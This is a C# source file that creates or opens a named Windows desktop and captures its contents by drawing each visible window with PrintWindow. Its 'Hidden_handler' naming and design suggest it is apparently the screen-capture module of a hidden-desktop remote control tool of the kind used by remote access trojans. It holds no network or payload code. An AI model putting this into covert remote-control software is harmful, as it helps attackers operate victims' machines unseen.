using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Hidden_handler
{
    class Imaging_handler
    {
        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE = 0,
            DESKTOP_READOBJECTS = 0x0001,
            DESKTOP_CREATEWINDOW = 0x0002,
            DESKTOP_CREATEMENU = 0x0004,
            DESKTOP_HOOKCONTROL = 0x0008,
            DESKTOP_JOURNALRECORD = 0x0010,
            DESKTOP_JOURNALPLAYBACK = 0x0020,
            DESKTOP_ENUMERATE = 0x0040,
            DESKTOP_WRITEOBJECTS = 0x0080,
            DESKTOP_SWITCHDESKTOP = 0x0100,
            GENERIC_ALL = (uint)(DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
                            DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                            DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP),
        }

        private struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        private enum GetWindowType : uint
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6
        }

        /// <summary>
        /// Retrieves a handle to a device context (DC) for the entire window, including title bar, menus, and scroll bars.
        /// A window device context permits painting anywhere in a window, because the origin of the device context is the upper-left corner of the window instead of the client area.
        /// </summary>
        /// <param name="hWnd">A handle to the window with a device context that is to be retrieved.</param>
        /// <returns>
        /// If the function succeeds, the return value is a handle to the device context for the specified window.
        /// If the function fails, the return value is <see cref="IntPtr.Zero"/>.
        /// </returns>
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);

        /// <summary>
        /// Sets the desktop of the calling thread to the specified desktop.
        /// </summary>
        /// <param name="hDesktop">A handle to the desktop to be set.</param>
        /// <returns>True if the desktop is successfully set; otherwise, false.</returns>
        /// <exception cref="System.ComponentModel.Win32Exception">Thrown when an error occurs while setting the desktop.</exception>
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetThreadDesktop(IntPtr hDesktop);

        /// <summary>
        /// Opens the specified desktop object.
        /// </summary>
        /// <param name="lpszDesktop">The name of the desktop to be opened.</param>
        /// <param name="dwFlags">Reserved; set to 0.</param>
        /// <param name="fInherit">If this value is TRUE, processes created by this process will inherit the handle. Otherwise, the processes do not inherit this handle.</param>
        /// <param name="dwDesiredAccess">The access to the desktop. For a list of access rights, see Desktop Security and Access Rights.</param>
        /// <returns>
        /// If the function succeeds, the return value is a handle to the opened desktop. If the function fails, the return value is NULL.
        /// </returns>
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        /// <summary>
        /// Creates a new desktop with the specified name and returns a handle to the desktop.
        /// </summary>
        /// <param name="lpszDesktop">The name of the new desktop.</param>
        /// <param name="lpszDevice">Reserved; must be NULL.</param>
        /// <param name="pDevmode">Reserved; must be NULL.</param>
        /// <param name="dwFlags">The desktop creation options. For a list of values, see https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-createdesktopw.</param>
        /// <param name="dwDesiredAccess">The access to the desktop. For a list of values, see https://docs.microsoft.com/en-us/windows/win32/secauthz/access-mask.</param>
        /// <param name="lpsa">Reserved; must be NULL.</param>
        /// <returns>A handle to the newly created desktop. If the function fails, it returns NULL. To get extended error information, call GetLastError.</returns>
        /// <exception cref="System.ComponentModel.Win32Exception">Thrown when the function fails to create the desktop. The exception contains the error code returned by GetLastError.</exception>
        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice,
            IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        /// <summary>
        /// Retrieves a handle to the desktop window. The desktop window covers the entire screen. The desktop window is the area on top of which other windows are painted.
        /// </summary>
        /// <returns>A handle to the desktop window.</returns>
        [DllImport("user32.dll", SetLastError = false)]
        static extern IntPtr GetDesktopWindow();

        /// <summary>
        /// Retrieves the dimensions of the bounding rectangle of the specified window.
        /// </summary>
        /// <param name="hwnd">A handle to the window.</param>
        /// <param name="lpRect">A pointer to a RECT structure that receives the screen coordinates of the upper-left and lower-right corners of the window.</param>
        /// <returns>true if the function succeeds, otherwise false.</returns>
        /// <exception cref="System.Runtime.InteropServices.ExternalException">Thrown when the function fails to retrieve the window dimensions.</exception>
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetWindowRect(IntPtr hwnd, out RECT lpRect);

        /// <summary>
        /// Determines whether the specified window is visible.
        /// </summary>
        /// <param name="hWnd">A handle to the window to be tested.</param>
        /// <returns><c>true</c> if the specified window is visible, <c>false</c> otherwise.</returns>
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindowVisible(IntPtr hWnd);

        /// <summary>
        /// The PrintWindow function retrieves the contents of a window or control that is currently being displayed on the screen.
        /// </summary>
        /// <param name="hwnd">A handle to the window or control from which to retrieve the contents.</param>
        /// <param name="hDC">A handle to a device context (DC) for the client area of the window or control.</param>
        /// <param name="nFlags">The drawing options. This parameter can be used to control how the window contents are retrieved.</param>
        /// <returns>
        /// If the function succeeds, the return value is true. If the function fails, the return value is false.
        /// </returns>
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);

        /// <summary>
        /// Retrieves a handle to the window that has the specified relationship to the specified window.
        /// </summary>
        /// <param name="hWnd">A handle to the window whose relationship is to be retrieved.</param>
        /// <param name="uCmd">The relationship between the specified window and the window whose handle is to be retrieved.</param>
        /// <returns>
        /// If the function succeeds, the return value is a handle to the window that has the specified relationship to the specified window.
        /// If the function fails, the return value is NULL. To get extended error information, call GetLastError.
        /// </returns>
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetWindow(IntPtr hWnd, GetWindowType uCmd);

        /// <summary>
        /// Retrieves a handle to the top-level window whose class name and window name match the specified strings.
        /// </summary>
        /// <param name="hWnd">A handle to a window. The search for a child window begins at this window and proceeds through child windows.</param>
        /// <returns>
        /// If the function succeeds, the return value is a handle to the top-level window that matches the specified strings.
        /// If the function fails, the return value is NULL.
        /// </returns>
        [DllImport("user32.dll")]
        static extern IntPtr GetTopWindow(IntPtr hWnd);

        /// <summary>
        /// Releases the device context (DC) that is associated with a specific window.
        /// </summary>
        /// <param name="hWnd">A handle to the window whose DC is to be released.</param>
        /// <param name="hDC">A handle to the DC to be released.</param>
        /// <returns>True if the DC was released successfully; otherwise, false.</returns>
        [DllImport("user32.dll")]
        static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

        /// <summary>
        /// Creates a memory device context (DC) compatible with the specified device.
        /// </summary>
        /// <param name="hdc">A handle to the device context of the window or printer to be used for the compatible DC.</param>
        /// <returns>A handle to a memory DC if the function is successful; otherwise, returns NULL.</returns>
        /// <remarks>
        /// This method creates a memory device context (DC) that is compatible with the specified device context (DC).
        /// The memory DC can be used as a target for BitBlt operations.
        /// </remarks>
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        /// <summary>
        /// Creates a bitmap compatible with the specified device context (DC) and returns a handle to the bitmap.
        /// </summary>
        /// <param name="hdc">A handle to the device context (DC) of a window or a printer.</param>
        /// <param name="nWidth">The width, in pixels, of the bitmap.</param>
        /// <param name="nHeight">The height, in pixels, of the bitmap.</param>
        /// <returns>A handle to the compatible bitmap if the function succeeds; otherwise, NULL.</returns>
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        /// <summary>
        /// Selects an object into the specified device context (DC).
        /// </summary>
        /// <param name="hdc">A handle to the device context.</param>
        /// <param name="hgdiobj">A handle to the object to be selected.</param>
        /// <returns>
        /// If the selected object is not a region and the function succeeds, the return value is a handle to the object being replaced.
        /// If the selected object is a region and the function succeeds, the return value is one of the following:
        /// SIMPLEREGION - Region consists of a single rectangle.
        /// COMPLEXREGION - Region consists of more than one rectangle.
        /// NULLREGION - Region is empty.
        /// If an error occurs and the function fails, the return value is NULL.
        /// </returns>
        [DllImport("gdi32.dll")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        /// <summary>
        /// Deletes a logical pen, brush, font, bitmap, region, or palette, freeing all system resources associated with the object.
        /// </summary>
        /// <param name="hObject">A handle to the object to be deleted.</param>
        /// <returns>true if the function succeeds, false if the function fails.</returns>
        [DllImport("gdi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DeleteObject(IntPtr hObject);

        /// <summary>
        /// Deletes a device context (DC) from memory.
        /// </summary>
        /// <param name="hdc">A handle to the device context (DC) to be deleted.</param>
        /// <returns>True if the device context (DC) is successfully deleted; otherwise, false.</returns>
        [DllImport("gdi32.dll")]
        static extern bool DeleteDC(IntPtr hdc);

        /// <summary>
        /// Closes the specified desktop.
        /// </summary>
        /// <param name="hDesktop">A handle to the desktop to be closed.</param>
        /// <returns><c>true</c> if the function succeeds; otherwise, <c>false</c>.</returns>
        /// <remarks>
        /// This method closes the desktop identified by the handle <paramref name="hDesktop"/>.
        /// </remarks>
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        /// <summary>
        /// Retrieves device-specific information for the specified device.
        /// </summary>
        /// <param name="hdc">A handle to the device context.</param>
        /// <param name="nIndex">The value to be retrieved.</param>
        /// <returns>The return value specifies the value of the desired capability.</returns>
        [DllImport("gdi32.dll")]
        private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

        private enum DeviceCap
        {
            VERTRES = 10,
            DESKTOPVERTRES = 117
        }

        public IntPtr Desktop = IntPtr.Zero;
        public Imaging_handler(string DesktopName) 
        {
            IntPtr Desk = OpenDesktop(DesktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);
            if (Desk == IntPtr.Zero)
            {
                Desk = CreateDesktop(DesktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
            }
            Desktop=Desk;
        }

        /// <summary>
        /// Retrieves the scaling factor of the screen.
        /// </summary>
        /// <returns>The scaling factor of the screen.</returns>
        /// <remarks>
        /// This method retrieves the scaling factor of the screen by comparing the logical and physical screen heights.
        /// It uses the Graphics class to obtain the device context of the desktop and then calculates the scaling factor using the obtained heights.
        /// The scaling factor is then returned as a float value.
        /// </remarks>
        private static float GetScalingFactor()
        {
            using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
            {
                IntPtr desktop = graphics.GetHdc();
                int logicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.VERTRES);
                int physicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.DESKTOPVERTRES);
                float scalingFactor = (float)physicalScreenHeight / logicalScreenHeight;
                return scalingFactor;
            }
        }

        /// <summary>
        /// Captures the application window and draws it on the specified graphics object.
        /// </summary>
        /// <param name="hWnd">A handle to the window to be captured.</param>
        /// <param name="ModifiableScreen">The graphics object on which the captured window will be drawn.</param>
        /// <param name="DC">A handle to the device context of the window.</param>
        /// <returns>True if the window was successfully captured and drawn; otherwise, false.</returns>
        /// <remarks>
        /// This method captures the specified window using the PrintWindow function and draws it on the specified graphics object.
        /// It also takes into account the scaling factor to ensure proper rendering on high DPI displays.
        /// </remarks>
        private bool DrawApplication(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
        {
            RECT r;
            bool returnValue = false;
            GetWindowRect(hWnd, out r);

            float scalingFactor = GetScalingFactor();
            IntPtr hDcWindow = CreateCompatibleDC(DC);
            IntPtr hBmpWindow = CreateCompatibleBitmap(DC, (int)((r.Right - r.Left) * scalingFactor), (int)((r.Bottom - r.Top) * scalingFactor));

            SelectObject(hDcWindow, hBmpWindow);
            uint nflag = 2;//0, in windows below 8.1 this way not work and needs to be 0
            if (PrintWindow(hWnd, hDcWindow, nflag))
            {
                try
                {
                    Bitmap processImage = Bitmap.FromHbitmap(hBmpWindow);
                    ModifiableScreen.DrawImage(processImage, new Point(r.Left, r.Top));
                    processImage.Dispose();
                    returnValue = true;
                }
                catch
                {

                }
            }
            DeleteObject(hBmpWindow);
            DeleteDC(hDcWindow);
            return returnValue;
        }

        /// <summary>
        /// Draws the windows from top to bottom on the screen.
        /// </summary>
        /// <param name="owner">The handle to the owner window.</param>
        /// <param name="ModifiableScreen">The graphics object representing the screen.</param>
        /// <param name="DC">The device context handle.</param>
        /// <remarks>
        /// This method retrieves the top window owned by the specified owner window and draws each window from top to bottom on the screen using the specified graphics object and device context handle.
        /// </remarks>
        private void DrawTopDown(IntPtr owner, Graphics ModifiableScreen, IntPtr DC)
        {
            IntPtr currentWindow = GetTopWindow(owner);
            if (currentWindow == IntPtr.Zero)
            {
                return;
            }
            currentWindow = GetWindow(currentWindow, GetWindowType.GW_HWNDLAST);
            if (currentWindow == IntPtr.Zero)
            {
                return;
            }
            while (currentWindow != IntPtr.Zero)
            {
                DrawHwnd(currentWindow, ModifiableScreen, DC);
                currentWindow = GetWindow(currentWindow, GetWindowType.GW_HWNDPREV);
            }
        }

        /// <summary>
        /// Draws the specified window on the given graphics object using the provided device context.
        /// </summary>
        /// <param name="hWnd">The handle to the window to be drawn.</param>
        /// <param name="ModifiableScreen">The graphics object on which the window will be drawn.</param>
        /// <param name="DC">The device context used for drawing.</param>
        /// <remarks>
        /// This method checks if the specified window is visible. If it is, it proceeds to draw the application associated with the window using the provided graphics object and device context.
        /// If the operating system version is less than 6, it also draws the top-down view of the window.
        /// </remarks>
        private void DrawHwnd(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
        {
            if (IsWindowVisible(hWnd))
            {
                DrawApplication(hWnd, ModifiableScreen, DC);
                if (Environment.OSVersion.Version.Major < 6)
                {
                    DrawTopDown(hWnd, ModifiableScreen,  DC);
                }
            }
        }

        /// <summary>
        /// Disposes the resources associated with the current object.
        /// </summary>
        /// <remarks>
        /// This method closes the desktop associated with the current object and performs garbage collection to release any remaining resources.
        /// </remarks>
        public void Dispose() 
        {
            CloseDesktop(Desktop);
            GC.Collect();
        }

        /// <summary>
        /// Takes a screenshot of the desktop and returns it as a Bitmap.
        /// </summary>
        /// <returns>A Bitmap object representing the screenshot of the desktop.</returns>
        public Bitmap Screenshot()
        {
            SetThreadDesktop(Desktop);
            IntPtr DC = GetDC(IntPtr.Zero);
            RECT DesktopSize;
            GetWindowRect(GetDesktopWindow(), out DesktopSize);
            float scalingFactor = GetScalingFactor();
            Bitmap Screen = new Bitmap((int)(DesktopSize.Right * scalingFactor), (int)(DesktopSize.Bottom * scalingFactor));
            Graphics ModifiableScreen = Graphics.FromImage(Screen);
            DrawTopDown(IntPtr.Zero, ModifiableScreen, DC);
            ModifiableScreen.Dispose();
            ReleaseDC(IntPtr.Zero, DC);
            return Screen;
        }
    }
}
